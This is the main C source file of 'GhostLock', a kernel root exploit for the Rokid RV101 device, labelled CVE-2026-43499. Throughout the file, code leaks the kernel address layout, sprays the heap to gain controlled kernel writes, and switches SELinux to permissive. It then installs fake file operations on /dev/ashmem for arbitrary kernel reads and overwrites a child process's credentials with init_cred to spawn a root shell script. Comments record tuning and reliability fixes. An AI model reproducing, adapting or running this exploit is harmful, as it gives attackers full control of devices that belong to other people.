/*
 * main.c — GhostLock (CVE-2026-43499) root exploit for Rokid RV101.
 *
 * Phase 1 (W1): controlled rb write zeroes selinux_state.enforcing
 *               (low byte of the written pointer = 0x00) -> permissive.
 * Phase 2 (W2): controlled rb write stores init_cred's direct-map alias
 *               into a child's task->cred -> uid 0 + full caps.
 */
#include "common.h"

int check_selinux_off(void) {
  int efd = open("/sys/fs/selinux/enforce", O_RDONLY);
  if (efd < 0) return 1;
  char b[4] = {0};
  read(efd, b, sizeof(b));
  close(efd);
  return b[0] == '0';
}

static void print_enforce_state(void) {
  int efd = open("/sys/fs/selinux/enforce", O_RDONLY);
  if (efd < 0) {
    pr_warning("enforce file unreadable errno=%d\n", errno);
    return;
  }
  char b[4] = {0};
  read(efd, b, sizeof(b));
  close(efd);
  pr_info("enforce file = '%c' (raw %02x %02x %02x %02x)\n", b[0],
          (unsigned)b[0], (unsigned)b[1], (unsigned)b[2], (unsigned)b[3]);
}

static struct timespec t0;  /* zero-initialized => T+ is measured since boot */
static double timer_ms(void) {
  struct timespec now;
  clock_gettime(CLOCK_MONOTONIC, &now);
  return (now.tv_sec - t0.tv_sec) * 1000.0 + (now.tv_nsec - t0.tv_nsec) / 1e6;
}
#define TIMER(label) pr_info("[T+%.0fms] %s\n", timer_ms(), label)

static int do_one_write(uintptr_t target, const char *desc, int mode) {
  int tdelta = env_int_range("GL_TARGET_DELTA", 0, -0x200, 0x200);
  target = (uintptr_t)((intptr_t)target + tdelta);
  pr_info("=== %s === target=0x%016zx mode=%d delta=%+d\n", desc, target, mode,
          tdelta);
  pselect_child_node = 1;
  int attempts = env_int_range("GL_SETUP_ATTEMPTS", KERNEL_PAGE_SETUP_ATTEMPTS, 1, KERNEL_PAGE_SETUP_ATTEMPTS);
  for (int attempt = 1; attempt <= attempts; attempt++) {
    page_base = prepare_good_kernel_page();
    if (!page_base) {
      pr_warning("  heap spray attempt %d/%d failed, retrying\n", attempt,
                 attempts);
      usleep(200000);
      continue;
    }
    if (mode == 3) {
      /* selftest: write into the sprayed page itself (recv-observable) */
      set_pselect_write_mode(page_base + SCRATCH_OFF, 0, 3);
    } else if (mode == 4) {
      /* FOPS install: write fake_fops into an arbitrary target */
      set_pselect_write_mode(target, fake_fops, 4);
    } else {
      set_pselect_write_mode(target, 0, mode);
    }
    run_main_route_threads();
    int wrote = cleanup_page_prepare_state();  /* strict-signature count */
    clear_pselect_write();
    if (wrote > 0) {
      pr_success("%s verified: %d vehicle(s) carried the STRICT walk "
                 "signature (attempt %d)\n",
                 desc, wrote, attempt);
      return 1;
    }
    pr_warning("  attempt %d/%d: strict walk signature not observed (payload "
               "not in place or walk missed), retrying\n",
               attempt, attempts);
    usleep(200000);
  }
  pr_error("  %s failed after %d attempts\n", desc, attempts);
  return 0;
}

/* single-shot write: init_cred -> target (child->cred), via mode-5.
 * mode-2 was WRONG on this kernel: its write#2 (`str tree_pc,[init_cred]`)
 * clobbers init_cred.uid because cred.usage is a 4-byte atomic_t so uid sits
 * at +0x04 (tree_pc>>32 = 0xffffff80 -> uid=-128). mode-5 instead:
 *   write#2 stores tree_pc(=init_cred) at *write_value(=target)  -> cred=init_cred
 *   write#1 stores write_value(=target)  at write_target(=init_cred+8) -> clobbers
 *           init_cred.gid@0x08 (NOT uid@0x04), harmless for getuid(). */
static int do_cred_write(uintptr_t target) {
  page_base = prepare_good_kernel_page();
  if (!page_base) return 0;
  pselect_child_node = 1;
  set_pselect_write_mode(data_addr(INIT_CRED) + 8, target, 5);
  run_main_route_threads();
  clear_pselect_write();
  cleanup_page_prepare_state();
  return 1;
}

/* v9.59 NOTE: do NOT add a kernel-side gid repair (4th reclaim cycle). A
 * 4th prepare_good_kernel_page() after the two cred writes is far more likely
 * to see dip=0 (leak slab never discarded — the memfd pins from the earlier
 * reclaims starve the per-CPU partial chain), and the pselect route then walks
 * a garbage fake page -> device panic (observed in run_w2_clean_v958_133632).
 * Instead the child fixes its own gid in user space: uid=0 via init_cred gives
 * CAP_SETGID, so setgroups(0)+setgid(0) clears the mode-5 WRITE#1 clobber. */

struct child_pipes { int task_r, task_w, cmd_r, cmd_w, uid_r, uid_w; };

static void child_main(struct child_pipes *p) {
  close(p->task_r); close(p->cmd_w); close(p->uid_r); close(p->task_w);
  /* No perf: the parent locates our task_struct via the configfs task walk
   * (find_task_by_tgid) after installing the fake fops. */
  char cmd;
  while (read(p->cmd_r, &cmd, 1) == 1) {
    if (cmd == 'C') {
      /* v9.59: user-space gid fix. At this point the parent has already
       * written init_cred into our task->cred, so getuid()==0 and our cred
       * (init_cred) carries CAP_SETGID/CAP_SETUID. Clear the supplementary
       * groups and re-set gid to 0 to undo the mode-5 WRITE#1 clobber of
       * init_cred->gid — no kernel-side repair write needed. */
      setgroups(0, NULL);
      setgid(0);
      uint32_t ids[2];
      ids[0] = getuid();
      ids[1] = getgid();
      write(p->uid_w, ids, sizeof(ids));
    } else if (cmd == 'G') break;
  }
  close(p->cmd_r); close(p->uid_w);
  if (getuid() != 0) _exit(1);
  pid_t gc = fork();
  if (gc == 0) {
    int efd = open("/sys/fs/selinux/enforce", O_WRONLY);
    if (efd >= 0) { write(efd, "0", 1); close(efd); }
    execl("/system/bin/sh", "sh", "/data/local/tmp/.ghostlock_root.sh", NULL);
    _exit(1);
  }
  if (gc > 0) waitpid(gc, NULL, 0);
  for (;;) pause();
}

static pid_t spawn_child(struct child_pipes *p) {
  int p1[2], p2[2], p3[2];
  if (pipe(p1) < 0 || pipe(p2) < 0 || pipe(p3) < 0) return -1;
  p->task_r = p1[0]; p->task_w = p1[1];
  p->cmd_r = p2[0]; p->cmd_w = p2[1];
  p->uid_r = p3[0]; p->uid_w = p3[1];
  pid_t child = fork();
  if (child < 0) return -1;
  if (child == 0) { child_main(p); _exit(1); }
  close(p->task_w); close(p->cmd_r); close(p->uid_w);
  return child;
}

static int run_write1_only(int attempts) {
  int selinux_ok = check_selinux_off();
  if (selinux_ok) {
    pr_success("SELinux already off\n");
    return 0;
  }
  for (int att = 1; att <= attempts; att++) {
    slab_drain();
    pr_info("Write 1 attempt %d/%d\n", att, attempts);
    do_one_write(data_addr(SELINUX_STATE), "W1: selinux_state.enforcing", 1);
    usleep(100000);
    print_enforce_state();
    if (check_selinux_off()) {
      pr_success("SELinux DISABLED (attempt %d)\n", att);
      return 0;
    }
  }
  pr_error("Write 1 failed after %d attempts\n", attempts);
  return 1;
}

int main(int argc, char **argv) {
  setvbuf(stderr, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);
  setpgid(0, 0);
  setrlimit(RLIMIT_CORE, &(struct rlimit){0, 0});

  pr_success("ghostlock_rv101 v9.60 — CVE-2026-43499 (GhostLock) / Rokid RV101 1.22.009\n");
  pr_success("startup: pid=%d uid=%u euid=%u gid=%u\n",
             getpid(), getuid(), geteuid(), getgid());

  int write1_only = 0;
  int selftest = 0;
  int write_dmesg = 0;
  int write_kptr = 0;
  int write1_text = 0;
  int write1_attempts = env_int_range("W1_ATTEMPTS", 5, 1, 20);
  for (int i = 1; i < argc; i++) {
    if (!strcmp(argv[i], "--write1")) write1_only = 1;
    else if (!strcmp(argv[i], "--write1-many")) write1_attempts = 20;
    else if (!strcmp(argv[i], "--write1-text")) { write1_only = 1; write1_text = 1; }
    else if (!strcmp(argv[i], "--selftest")) selftest = 1;
    else if (!strcmp(argv[i], "--write-dmesg")) write_dmesg = 1;
    else if (!strcmp(argv[i], "--write-kptr")) write_kptr = 1;
  }

  /* optional physical-load override (data_addr tuning) */
  {
    char *pv = getenv("GL_KERNEL_PHYS_LOAD");
    if (pv && *pv) {
      uint64_t v = strtoull(pv, NULL, 0);
      if (v) set_kernel_phys_load(v);
    }
  }

  pin_to_core(CORE);
  disable_rseq_for_thread();

  TIMER("KASLR leak");
  if (!leak_kaslr()) {
    pr_error("KASLR leak failed\n");
    return 1;
  }

  write_root_script();

  if (selftest) {
    slab_drain();
    int n = env_int_range("SELFTEST_RUNS", 1, 1, 100);
    int hits = 0;
    for (int i = 0; i < n; i++) {
      pr_info("selftest run %d/%d\n", i + 1, n);
      int ok = do_one_write(0, "SELFTEST: write into sprayed page", 3);
      if (ok) hits++;
      pr_info("selftest run %d/%d done (hit=%d)  [%d/%d hits so far]\n",
              i + 1, n, ok, hits, i + 1);
      usleep(100000);
    }
    pr_success("SELFTEST summary: %d/%d runs hit the STRICT signature\n",
               hits, n);
    return hits == n ? 0 : 1;
  }

  if (write1_only) {
    if (write1_text) {
      /* write to the RUNTIME kernel VA (text_addr) instead of the direct-map
       * alias (data_addr) — hypothesis: RV101 kernel image lives at a HIGH
       * physical address and the direct-map alias is not the real page. */
      for (int att = 1; att <= write1_attempts; att++) {
        slab_drain();
        pr_info("Write1-text attempt %d/%d\n", att, write1_attempts);
        do_one_write(text_addr(SELINUX_STATE), "W1-text: selinux_state (VA)", 1);
        usleep(100000);
        print_enforce_state();
        if (check_selinux_off()) {
          pr_success("SELinux DISABLED (text_addr) attempt %d\n", att);
          return 0;
        }
      }
      pr_error("Write1-text failed after %d attempts\n", write1_attempts);
      return 1;
    }
    return run_write1_only(write1_attempts);
  }

  /* write-probe: hit a known .data/.bss symbol so we can observe (via sysctl
   * side-effect) whether the rb_erase write actually lands in kernel-image
   * memory at data_addr(). Decisive for the W1 "no flip" question. */
  if (write_dmesg) {
    slab_drain();
    for (int att = 1; att <= 4; att++) {
      pr_info("write-dmesg attempt %d/4\n", att);
      do_one_write(data_addr(KIMAGE_TEXT_BASE + DMESG_RESTRICT_OFF),
                   "dmesg_restrict probe", 1);
      usleep(100000);
    }
    return 0;
  }
  if (write_kptr) {
    slab_drain();
    for (int att = 1; att <= 4; att++) {
      pr_info("write-kptr attempt %d/4\n", att);
      do_one_write(data_addr(KIMAGE_TEXT_BASE + KPTR_RESTRICT_OFF),
                   "kptr_restrict probe", 1);
      usleep(100000);
    }
    return 0;
  }

  /* ---- W2 FOPS route: cred = init_cred (perf is blocked; use fake fops +
   * configfs arbitrary r/w to locate the child task_struct). ---- */
  /* v9.39: the spawn_child (a fork that stays alive for the cred overwrite)
   * was forked BEFORE the FOPS install; its kernel-stack alloc pushed the
   * slab_drain's parked stacks over the vmap purge threshold, flooding the
   * order-2 buddy and burying the leak slab (W2 route 0/6 vs selftest 2/3).
   * Spawn it AFTER the install instead — the reclaimed fake_fops page is
   * already in place by then. */
  struct child_pipes pipes;
  pid_t child = -1;

  /* 1) install fake_fops into ashmem_misc.fops and open /dev/ashmem. The
   * fake fops table lives in the reclaimed SKB slab and must STAY allocated
   * while /dev/ashmem routes read/write through it, so we defer the cleanup
   * (cleanup_page_prepare_state) until the configfs ops are done. */
  uintptr_t fops_target =
      data_addr(KIMAGE_TEXT_BASE + ASHMEM_MISC_OFF) + ASHMEM_MISC_FOPS_OFF;
  uintptr_t head = data_addr(INIT_TASK + TASK_TASKS_OFF);
  /* v9.44 DIAG: override the configfs read target to bisect the pread panic
   * (kernel-image VA vs direct-map VA). */
  {
    unsigned long rt = env_hex("GL_READ_TARGET", 0);
    if (rt) head = (uintptr_t)rt;
  }
  int fd = -1;
  int installed = 0;
  /* v9.47: the selftest/write1 paths all call slab_drain() (3 waves of fork/
   * kill churn) to warm the per-CPU partial chains before the reclaim; the W2
   * FOPS route skipped it, which is the most plausible explanation for mode-5
   * write#1 landing ~25% vs selftest 67% (the "paradox"). Prime it once here
   * before the install loop so the first prepare matches the selftest state. */
  slab_drain();
  /* v9.60: attempts 3-6 are almost always dip=0 (the memfd pins leaked by the
   * first two prepare_good_kernel_page() cycles starve the per-CPU partial
   * chain, so the leak slab is never discarded) — retrying past attempt 2 only
   * wastes ~30-60s of mm-leak each. Default 3 (2 real chances + 1 marginal);
   * FOPS_ATTEMPTS env overrides. */
  int fops_attempts = env_int_range("FOPS_ATTEMPTS", 3, 1, FOPS_ATTEMPTS);
  for (int att = 1; att <= fops_attempts && !installed; att++) {
    pr_info("FOPS install attempt %d/%d\n", att, fops_attempts);
    /* install fake_fops (mode-5 write#2, v9.32) WITHOUT freeing the sprayed
     * page — the page must stay alive while /dev/ashmem routes through it.
     * We verify the install via the configfs probe below (not STRICT, which
     * would require freeing the page and leave a stale fake_fops pointer). */
    int ok = env_flag("GL_FOPS_V2", 1)
                 ? install_fake_fops_v2(fops_target)
                 : install_fake_fops(fops_target);
    if (!ok) {
      /* reclaim failed (write#1 MISSED): the fake fops page is stale but
       * write#2 already stored its (garbage) address into ashmem_misc.fops.
       * Release the SKB vehicles and retry; the next attempt's write#2 will
       * overwrite fops with a fresh fake_fops pointer. */
      cleanup_page_prepare_state();
      usleep(200000);
      continue;
    }
    fd = open_ashmem_device();
    if (fd < 0) {
      pr_warning("open /dev/ashmem failed errno=%d\n", errno);
      cleanup_page_prepare_state();
      usleep(200000);
      continue;
    }
    uintptr_t probe = kernel_read64(fd, head);
    if (probe && probe != head) {
      installed = 1;
      pr_info("configfs probe: init_task.tasks.next = 0x%016zx\n", probe);
    } else {
      pr_warning("configfs probe failed (probe=0x%zx), retrying\n", probe);
      close(fd);
      cleanup_page_prepare_state();
      usleep(200000);
    }
  }
  if (!installed) {
    pr_error("FOPS install failed after %d attempts\n", fops_attempts);
    return 1;
  }
  pr_success("fake_fops installed into ashmem_misc.fops\n");
  TIMER("FOPS installed");

  /* v9.50: the task walk (find_task_by_tgid) must READ heap task_structs, which
   * panics (configfs read only passes the kernel-image whitelist; the hardened
   * usercopy vmemmap walk faults on direct-map heap). Instead, exploit that
   * init_task.tasks is STATIC (readable) and fork inserts each new task at the
   * list TAIL: spawn a fresh child, read init_task.tasks.prev (head+8) — a
   * single kernel-image read — to get the newest task's tasks address, then
   * blind-write init_cred into task+cred and verify via the child's uid. The
   * only race is another fork landing between spawn and the read; a missed
   * round just retries with a fresh child. */
  int got_root = 0;
  int w2_attempts = env_int_range("W2_ATTEMPTS", 10, 1, 30);
  child = -1;
  pipes.cmd_w = pipes.uid_r = -1;
  for (int round = 1; round <= w2_attempts && !got_root; round++) {
    struct child_pipes p;
    pid_t c = spawn_child(&p);
    if (c < 0) {
      pr_error("fork failed (round %d)\n", round);
      break;
    }
    close(p.task_r);
    /* v9.51 DIAG: read tasks.prev twice to detect tail-race churn; read
     * init_cred.usage (offset 0, kernel-image so heap-read-free) around each
     * mode-2 write — write#2 stores tree_pc into init_cred.usage, so a change
     * proves the rb_erase walk actually landed (and write#1 landed with it). */
    uintptr_t prev = kernel_read64(fd, head + 8);  /* init_task.tasks.prev */
    uintptr_t prev2 = kernel_read64(fd, head + 8);
    uintptr_t task = prev ? (prev - TASK_TASKS_OFF) : 0;
    pr_info("round %d/%d: child=%d prev=0x%016zx prev2=0x%016zx stable=%d task=0x%016zx\n",
            round, w2_attempts, c, prev, prev2, prev == prev2, task);
    if (task) {
      pr_info("  cred_slot=0x%016zx real_cred_slot=0x%016zx init_cred=0x%016zx\n",
              task + TASK_CRED_OFF, task + TASK_REAL_CRED_OFF, data_addr(INIT_CRED));
      do_cred_write(task + TASK_CRED_OFF);
      do_cred_write(task + TASK_REAL_CRED_OFF);
      usleep(50000);
      write(p.cmd_w, "C", 1);
      uint32_t ids[2] = {9999, 9999};
      read(p.uid_r, ids, sizeof(ids));
      pr_info("child uid = %u (0x%08x) gid = %u (0x%08x)\n",
              ids[0], ids[0], ids[1], ids[1]);
      if (ids[0] == 0) {
        pr_success("child is root!\n");
        got_root = 1;
        child = c;
        pipes = p;
        break;
      }
    }
    /* missed (race or read failure): retire this child, retry fresh */
    write(p.cmd_w, "G", 1);
    close(p.cmd_w); close(p.uid_r);
    waitpid(c, NULL, 0);
  }

  if (child >= 0) {
    write(pipes.cmd_w, "G", 1);
    close(pipes.cmd_w); close(pipes.uid_r);
  }
  /* release the fake fops page now that configfs ops are done */
  cleanup_page_prepare_state();
  close(fd);

  if (!got_root) {
    pr_error("failed after %d rounds\n", w2_attempts);
    if (child >= 0) waitpid(child, NULL, 0);
    return 1;
  }

  sleep(2);
  TIMER("exploit complete — root shell spawned via /data/local/tmp/.ghostlock_root.sh");
  return 0;
}
